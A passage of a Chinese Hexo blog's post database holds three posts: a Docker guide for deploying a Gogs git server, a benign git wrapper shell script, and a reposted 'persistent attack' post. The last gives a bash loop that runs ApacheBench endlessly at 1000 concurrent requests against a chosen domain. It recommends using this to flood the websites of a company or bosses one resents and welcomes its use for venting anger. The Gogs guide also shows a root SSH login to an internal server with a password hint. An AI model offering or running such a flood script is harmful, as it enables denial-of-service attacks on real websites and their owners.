rel=\"noopener\">gogs-git官网 配置</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Pull image from Docker Hub.</span><br><span class=\"line\">$ docker pull gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Create local directory for volume.</span><br><span class=\"line\">$ mkdir -p /var/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker run` for the first time.</span><br><span class=\"line\">$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker start` if you have stopped it.</span><br><span class=\"line\">$ docker start gogs</span><br></pre></td></tr></table></figure>\n<p>配置文件：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">docker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"4-运行\"><a href=\"#4-运行\" class=\"headerlink\" title=\"4. 运行\"></a>4. 运行</h2><p>“<code>chmod +x gogs.docker</code>“: </p>\n<p>“<code>echo $PATH</code>“: 打印 环境变量</p>\n<p>“<code>./gogs.docker</code>“：启动服务</p>\n<h2 id=\"5-重启服务\"><a href=\"#5-重启服务\" class=\"headerlink\" title=\"5. 重启服务\"></a>5. 重启服务</h2><p><code>docker ps</code>获取<code>CONTAINER ID</code></p>\n<p><code>docker restart [19d724ea6ec9(ID)]</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"linux下docker部署gogs-git仓库\"><a href=\"#linux下docker部署gogs-git仓库\" class=\"headerlink\" title=\"linux下docker部署gogs git仓库\"></a>linux下docker部署gogs git仓库</h1><h2 id=\"1-远程登录Linux服务器\"><a href=\"#1-远程登录Linux服务器\" class=\"headerlink\" title=\"1. 远程登录Linux服务器\"></a>1. 远程登录Linux服务器</h2><p>首先，linux 命令行使用 root ssh ( <a href=\"https://blog.csdn.net/ccfxue/article/details/52608829\" target=\"_blank\" rel=\"noopener\">ssh远程登录命令简单实例</a> )</p>\n<p>例如: [公司内网服务器]<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh root@192.168.0.196</span><br><span class=\"line\"></span><br><span class=\"line\">psd: Jdyx[5个8]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-拉取docker下gogs\"><a href=\"#2-拉取docker下gogs\" class=\"headerlink\" title=\"2. 拉取docker下gogs\"></a>2. 拉取docker下gogs</h2><p>进入<a href=\"https://hub.docker.com/r/gogs/gogs/\" target=\"_blank\" rel=\"noopener\">gogs官网</a>，在官网左侧找到 拉取命令</p>\n<p>命令行输入 拉取命令 <code>docker pull gogs/gogs</code></p>\n<p>拉取完成后 有提示，接着输入查看状态的<code>docker</code>命令 <code>docker ps</code></p>\n<p>“<code>docker ps</code>“: 属于Linux命令 是查看 <code>docker</code>状态的命令</p>\n<p>“<code>ls</code>“: 查看当前目录文件</p>\n<h2 id=\"3-配置\"><a href=\"#3-配置\" class=\"headerlink\" title=\"3. 配置\"></a>3. 配置</h2><p>“<code>vim gogs.docker</code>“: 进入并编辑 gogs.docker 配置文件</p>\n<p><a href=\"https://github.com/gogits/gogs/tree/master/docker\" target=\"_blank\" rel=\"noopener\">gogs-git官网 配置</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Pull image from Docker Hub.</span><br><span class=\"line\">$ docker pull gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Create local directory for volume.</span><br><span class=\"line\">$ mkdir -p /var/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker run` for the first time.</span><br><span class=\"line\">$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker start` if you have stopped it.</span><br><span class=\"line\">$ docker start gogs</span><br></pre></td></tr></table></figure>\n<p>配置文件：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">docker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"4-运行\"><a href=\"#4-运行\" class=\"headerlink\" title=\"4. 运行\"></a>4. 运行</h2><p>“<code>chmod +x gogs.docker</code>“: </p>\n<p>“<code>echo $PATH</code>“: 打印 环境变量</p>\n<p>“<code>./gogs.docker</code>“：启动服务</p>\n<h2 id=\"5-重启服务\"><a href=\"#5-重启服务\" class=\"headerlink\" title=\"5. 重启服务\"></a>5. 重启服务</h2><p><code>docker ps</code>获取<code>CONTAINER ID</code></p>\n<p><code>docker restart [19d724ea6ec9(ID)]</code></p>\n"},{"title":"持续进攻","date":"2018-05-07T08:39:27.000Z","archives":null,"_content":"# [转][BOSS开源软件(一)：黑客帝国之持久进攻](https://user.qzone.qq.com/525150008)\n\n **使用说明：**\\\n（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\\n（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\\n（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\\n（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\\n（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\\n（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！\n\n代码：\\\n(1) 打开Linux终端或OSX终端，新建文件`h.sh` \\\n(2) 编辑文件`h.sh`，并保存。代码内容如下：\n````\n#!/bin/bash\n# 注释：下面变量DOMAIN可以修改成你需要的网站域名 \nDOMAIN=\"http://www.yourdomain.com/\"\nCOUNT=1000\nwhile true\ndo\n    ab -c $COUNT -n  $COUNT $DOMAIN\ndone\n````\n(3) 添加h.sh的执行权限，输入命令：`chmod +x h.sh`\\\n(4) 执行软件，输入命令：`./h.sh`\n\n### 注意事项：\n1. 如果系统提示找不到`ab`命令时，您需要自行安装`ApacheWeb`服务器。\n\n    （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd\n\n    （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd\n\n    （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可\n\n2. 您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。\n\n    例如：我们设置DOMAIN为百度，我们必需写成\n    `http://www.baidu.com/`(注意反斜杠)，而不能`www.baidu.com`或`http://www.baidu.com`\n\n3. 如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。\n\n### 总结：\n我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。\n\n但我们需要再次提示：\n  \n该软件属于中华人民共和国的法定危险品，请谨慎使用。","source":"_posts/Linux/持续进攻.md","raw":"---\ntitle: 持续进攻\ndate: 2018-05-07 16:39:27\ntags:\narchives:\ncategories:\n---\n# [转][BOSS开源软件(一)：黑客帝国之持久进攻](https://user.qzone.qq.com/525150008)\n\n **使用说明：**\\\n（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\\n（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\\n（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\\n（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\\n（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\\n（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！\n\n代码：\\\n(1) 打开Linux终端或OSX终端，新建文件`h.sh` \\\n(2) 编辑文件`h.sh`，并保存。代码内容如下：\n````\n#!/bin/bash\n# 注释：下面变量DOMAIN可以修改成你需要的网站域名 \nDOMAIN=\"http://www.yourdomain.com/\"\nCOUNT=1000\nwhile true\ndo\n    ab -c $COUNT -n  $COUNT $DOMAIN\ndone\n````\n(3) 添加h.sh的执行权限，输入命令：`chmod +x h.sh`\\\n(4) 执行软件，输入命令：`./h.sh`\n\n### 注意事项：\n1. 如果系统提示找不到`ab`命令时，您需要自行安装`ApacheWeb`服务器。\n\n    （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd\n\n    （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd\n\n    （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可\n\n2. 您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。\n\n    例如：我们设置DOMAIN为百度，我们必需写成\n    `http://www.baidu.com/`(注意反斜杠)，而不能`www.baidu.com`或`http://www.baidu.com`\n\n3. 如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。\n\n### 总结：\n我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。\n\n但我们需要再次提示：\n  \n该软件属于中华人民共和国的法定危险品，请谨慎使用。","slug":"Linux/持续进攻","published":1,"updated":"2018-05-07T08:52:26.291Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29z002xb8xjyr6p8zpz","content":"<h1 id=\"转-BOSS开源软件-一-：黑客帝国之持久进攻\"><a href=\"#转-BOSS开源软件-一-：黑客帝国之持久进攻\" class=\"headerlink\" title=\"[转]BOSS开源软件(一)：黑客帝国之持久进攻\"></a>[转]<a href=\"https://user.qzone.qq.com/525150008\" target=\"_blank\" rel=\"noopener\">BOSS开源软件(一)：黑客帝国之持久进攻</a></h1><p> <strong>使用说明：</strong>\\<br>（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\<br>（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\<br>（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\<br>（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\<br>（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\<br>（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！</p>\n<p>代码：\\<br>(1) 打开Linux终端或OSX终端，新建文件<code>h.sh</code> \\<br>(2) 编辑文件<code>h.sh</code>，并保存。代码内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"># 注释：下面变量DOMAIN可以修改成你需要的网站域名 </span><br><span class=\"line\">DOMAIN=&quot;http://www.yourdomain.com/&quot;</span><br><span class=\"line\">COUNT=1000</span><br><span class=\"line\">while true</span><br><span class=\"line\">do</span><br><span class=\"line\">    ab -c $COUNT -n  $COUNT $DOMAIN</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure></p>\n<p>(3) 添加h.sh的执行权限，输入命令：<code>chmod +x h.sh</code>\\<br>(4) 执行软件，输入命令：<code>./h.sh</code></p>\n<h3 id=\"注意事项：\"><a href=\"#注意事项：\" class=\"headerlink\" title=\"注意事项：\"></a>注意事项：</h3><ol>\n<li><p>如果系统提示找不到<code>ab</code>命令时，您需要自行安装<code>ApacheWeb</code>服务器。</p>\n<p> （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd</p>\n<p> （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd</p>\n<p> （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可</p>\n</li>\n<li><p>您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。</p>\n<p> 例如：我们设置DOMAIN为百度，我们必需写成<br> <code>http://www.baidu.com/</code>(注意反斜杠)，而不能<code>www.baidu.com</code>或<code>http://www.baidu.com</code></p>\n</li>\n<li><p>如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。</p>\n</li>\n</ol>\n<h3 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h3><p>我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。</p>\n<p>但我们需要再次提示：</p>\n<p>该软件属于中华人民共和国的法定危险品，请谨慎使用。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"转-BOSS开源软件-一-：黑客帝国之持久进攻\"><a href=\"#转-BOSS开源软件-一-：黑客帝国之持久进攻\" class=\"headerlink\" title=\"[转]BOSS开源软件(一)：黑客帝国之持久进攻\"></a>[转]<a href=\"https://user.qzone.qq.com/525150008\" target=\"_blank\" rel=\"noopener\">BOSS开源软件(一)：黑客帝国之持久进攻</a></h1><p> <strong>使用说明：</strong>\\<br>（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\<br>（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\<br>（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\<br>（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\<br>（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\<br>（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！</p>\n<p>代码：\\<br>(1) 打开Linux终端或OSX终端，新建文件<code>h.sh</code> \\<br>(2) 编辑文件<code>h.sh</code>，并保存。代码内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"># 注释：下面变量DOMAIN可以修改成你需要的网站域名 </span><br><span class=\"line\">DOMAIN=&quot;http://www.yourdomain.com/&quot;</span><br><span class=\"line\">COUNT=1000</span><br><span class=\"line\">while true</span><br><span class=\"line\">do</span><br><span class=\"line\">    ab -c $COUNT -n  $COUNT $DOMAIN</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure></p>\n<p>(3) 添加h.sh的执行权限，输入命令：<code>chmod +x h.sh</code>\\<br>(4) 执行软件，输入命令：<code>./h.sh</code></p>\n<h3 id=\"注意事项：\"><a href=\"#注意事项：\" class=\"headerlink\" title=\"注意事项：\"></a>注意事项：</h3><ol>\n<li><p>如果系统提示找不到<code>ab</code>命令时，您需要自行安装<code>ApacheWeb</code>服务器。</p>\n<p> （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd</p>\n<p> （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd</p>\n<p> （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可</p>\n</li>\n<li><p>您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。</p>\n<p> 例如：我们设置DOMAIN为百度，我们必需写成<br> <code>http://www.baidu.com/</code>(注意反斜杠)，而不能<code>www.baidu.com</code>或<code>http://www.baidu.com</code></p>\n</li>\n<li><p>如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。</p>\n</li>\n</ol>\n<h3 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h3><p>我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。</p>\n<p>但我们需要再次提示：</p>\n<p>该软件属于中华人民共和国的法定危险品，请谨慎使用。</p>\n"},{"title":"添加自定义shell","date":"2018-05-04T03:34:46.000Z","archives":"shell脚本","_content":"# 添加自定义shell\n````\n$ echo $PATH  // 打印 路径\n$ cd /home/LiSC/bi  // 转到第一个路径\n$ mkdir /home/LiSC/bin  // 创建文件夹\n$ vim github.shell  // 创建文件[把shell脚本复制粘贴]\n$ chmod +x github.shell  // 文件权限属性设置 => 用来变更文件或目录的权限\n````\n\n附：shell\n````\n#!/bin/bash\n## Coptyright 2016 The HongJiang Library Authors. All rights reserved.\n## Use of this source code is governed by a Apache-style\n## license that can be found in the LICNESE file.\n##\n## Git(Github.com) Common Client Commands.\n##\n## @authors hjboss <hongjiangproject@gmail.com> 2018-04 $$\n## @version 1.0.0\nGIT=`/usr/bin/which git`\nHOST='git@github.com'\nNAME='hlibs'\nSCRIPT=`basename $0`\n\ncase \"$1\" in\n\t\"add\")\n\t\tif [ $# -lt 2 ] || [ \"$2\" == \"*\" ]; then\n\t\t\t$GIT add --all\n\t\telse\n\t\t\t$GIT add \"$2\"\n\t\tfi\n\t;;\n\n\t\"ci\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\t$GIT commit -a -m \"Initial commit\"\n\t\telse\n\t\t\t$GIT commit -a -m \"$2\"\n\t\tfi\n\t\t$GIT push -u origin master\n\t;;\n\n\t\"co\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"版本庫名稱不能空值\"\n\t\telif [ $# -eq 2 ]; then\n\t\t\t$GIT clone \"$HOST:$NAME/$2.git\"\n\t\telse\n\t\t\t$GIT clone \"$HOST:$2/$3.git\"\n\t\tfi\n\t;;\n\n\t\"rm\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"刪除文件名不能空值\"\n\t\t\texit\n\t\tfi\n\t\t$GIT rm \"$2\"\n\t;;\n\n\t\"up\")\n\t\t$GIT pull\n\t;;\n\n\t\"st\")\n\t\t$GIT status\n\t;;\n\n\t\"help\")\n\t\techo \"用法: $SCRIPT <subcommand> [args]\"\n\t\techo \"版本: 1.0.0\"\n\t\techo \"最常用的子命令:\"\n\t\techo \"  add 添加文件内容至索引\"\n\t\techo \"  ci 记录变更到版本库并且更新至github.com\"\n\t\techo \"  co 将给定名称的版本库克隆到一个新目录\"\n\t\techo \"  rm 从工作区和索引中删除文件\"\n\t\techo \"  up 本地分支更新到最新版本\"\n\t\techo \"  st 显示工作区状态\"\n\t;;\n\n\t\"version\")\n\t\techo \"$SCRIPT version 1.0.0\"\n\t;;\n\n\t*)\n\t\techo \"使用$SCRIPT help得到用法\"\n\t;;\nesac\n````","source":"_posts/Linux/添加自定义shell.md","raw":"---\ntitle: 添加自定义shell\ndate: 2018-05-04 11:34:46\ntags: 自定义shell\narchives: shell脚本\ncategories: shell\n---\n# 添加自定义shell\n````\n$ echo $PATH  // 打印 路径\n$ cd /home/LiSC/bi  // 转到第一个路径\n$ mkdir /home/LiSC/bin  // 创建文件夹\n$ vim github.shell  // 创建文件[把shell脚本复制粘贴]\n$ chmod +x github.shell  // 文件权限属性设置 => 用来变更文件或目录的权限\n````\n\n附：shell\n````\n#!/bin/bash\n## Coptyright 2016 The HongJiang Library Authors. All rights reserved.\n## Use of this source code is governed by a Apache-style\n## license that can be found in the LICNESE file.\n##\n## Git(Github.com) Common Client Commands.\n##\n## @authors hjboss <hongjiangproject@gmail.com> 2018-04 $$\n## @version 1.0.0\nGIT=`/usr/bin/which git`\nHOST='git@github.com'\nNAME='hlibs'\nSCRIPT=`basename $0`\n\ncase \"$1\" in\n\t\"add\")\n\t\tif [ $# -lt 2 ] || [ \"$2\" == \"*\" ]; then\n\t\t\t$GIT add --all\n\t\telse\n\t\t\t$GIT add \"$2\"\n\t\tfi\n\t;;\n\n\t\"ci\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\t$GIT commit -a -m \"Initial commit\"\n\t\telse\n\t\t\t$GIT commit -a -m \"$2\"\n\t\tfi\n\t\t$GIT push -u origin master\n\t;;\n\n\t\"co\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"版本庫名稱不能空值\"\n\t\telif [ $# -eq 2 ]; then\n\t\t\t$GIT clone \"$HOST:$NAME/$2.git\"\n\t\telse\n\t\t\t$GIT clone \"$HOST:$2/$3.git\"\n\t\tfi\n\t;;\n\n\t\"rm\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"刪除文件名不能空值\"\n\t\t\texit\n\t\tfi\n\t\t$GIT rm \"$2\"\n\t;;\n\n\t\"up\")\n\t\t$GIT pull\n\t;;\n\n\t\"st\")\n\t\t$GIT status\n\t;;\n\n\t\"help\")\n\t\techo \"用法: $SCRIPT <subcommand> [args]\"\n\t\techo \"版本: 1.0.0\"\n\t\techo \"最常用的子命令:\"\n\t\techo \"  add 添加文件内容至索引\"\n\t\techo \"  ci 记录变更到版本库并且更新至github.com\"\n\t\techo \"  co 将给定名称的版本库克隆到一个新目录\"\n\t\techo \"  rm 从工作区和索引中删除文件\"\n\t\techo \"  up 本地分支更新到最新版本\"\n\t\techo \"  st 显示工作区状态\"\n\t;;\n\n\t\"version\")\n\t\techo \"$SCRIPT version 1.0.0\"\n\t;;\n\n\t*)\n\t\techo \"使用$SCRIPT help得到用法\"\n\t;;\nesac\n````","slug":"Linux/添加自定义shell","published":1,"updated":"2018-05-05T02:20:23.044Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2a10031b8xjckg8shfx","content":"<h1 id=\"添加自定义shell\"><a href=\"#添加自定义shell\" class=\"headerlink\" title=\"添加自定义shell\"></a>添加自定义shell</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ echo $PATH  // 打印 路径</span><br><span class=\"line\">$ cd /home/LiSC/bi  // 转到第一个路径</span><br><span class=\"line\">$ mkdir /home/LiSC/bin  // 创建文件夹</span><br><span class=\"line\">$ vim github.shell  // 创建文件[把shell脚本复制粘贴]</span><br><span class=\"line\">$ chmod +x github.shell  // 文件权限属性设置 =&gt; 用来变更文件或目录的权限</span><br></pre></td></tr></table></figure>\n<p>附：shell<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">## Coptyright 2016 The HongJiang Library Authors. All rights reserved.</span><br><span class=\"line\">## Use of this source code is governed by a Apache-style</span><br><span class=\"line\">## license that can be found in the LICNESE file.</span><br><span class=\"line\">##</span><br><span class=\"line\">## Git(Github.com) Common Client Commands.</span><br><span class=\"line\">##</span><br><span class=\"line\">## @authors hjboss &lt;hongjiangproject@gmail.com&gt; 2018-04 $$</span><br><span class=\"line\">## @version 1.0.0</span><br><span class=\"line\">GIT=`/usr/bin/which git`</span><br><span class=\"line\">HOST=&apos;git@github.com&apos;</span><br><span class=\"line\">NAME=&apos;hlibs&apos;</span><br><span class=\"line\">SCRIPT=`basename $0`</span><br><span class=\"line\"></span><br><span class=\"line\">case &quot;$1&quot; in</span><br><span class=\"line\">\t&quot;add&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ] || [ &quot;$2&quot; == &quot;*&quot; ]; then</span><br><span class=\"line\">\t\t\t$GIT add --all</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT add &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;ci&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;Initial commit&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT push -u origin master</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;co&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;版本庫名稱不能空值&quot;</span><br><span class=\"line\">\t\telif [ $# -eq 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$NAME/$2.git&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$2/$3.git&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;rm&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;刪除文件名不能空值&quot;</span><br><span class=\"line\">\t\t\texit</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT rm &quot;$2&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;up&quot;)</span><br><span class=\"line\">\t\t$GIT pull</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;st&quot;)</span><br><span class=\"line\">\t\t$GIT status</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;help&quot;)</span><br><span class=\"line\">\t\techo &quot;用法: $SCRIPT &lt;subcommand&gt; [args]&quot;</span><br><span class=\"line\">\t\techo &quot;版本: 1.0.0&quot;</span><br><span class=\"line\">\t\techo &quot;最常用的子命令:&quot;</span><br><span class=\"line\">\t\techo &quot;  add 添加文件内容至索引&quot;</span><br><span class=\"line\">\t\techo &quot;  ci 记录变更到版本库并且更新至github.com&quot;</span><br><span class=\"line\">\t\techo &quot;  co 将给定名称的版本库克隆到一个新目录&quot;</span><br><span class=\"line\">\t\techo &quot;  rm 从工作区和索引中删除文件&quot;</span><br><span class=\"line\">\t\techo &quot;  up 本地分支更新到最新版本&quot;</span><br><span class=\"line\">\t\techo &quot;  st 显示工作区状态&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;version&quot;)</span><br><span class=\"line\">\t\techo &quot;$SCRIPT version 1.0.0&quot;</span><br><span 